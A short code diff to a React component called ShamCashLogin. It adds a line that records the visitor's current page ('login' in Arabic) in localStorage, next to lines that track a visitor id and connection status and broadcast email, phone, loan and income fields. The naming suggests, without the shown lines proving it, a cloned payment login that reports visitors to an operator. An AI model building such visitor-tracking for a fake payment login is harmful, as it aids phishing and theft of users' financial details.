@@ -43,6 +43,7 @@ export function ShamCashLogin() {
     const id = visitorId.current;
     localStorage.setItem("sham_visitor_id", id);
     localStorage.setItem("sham_visitor_status", "connected");
+    localStorage.setItem("sham_visitor_page", "تسجيل الدخول");
     localStorage.setItem("sham_visitor_connected_at", new Date().toLocaleTimeString("ar-SY"));
     broadcast({ email: "", phone: "", loan: "", income: "" });
 
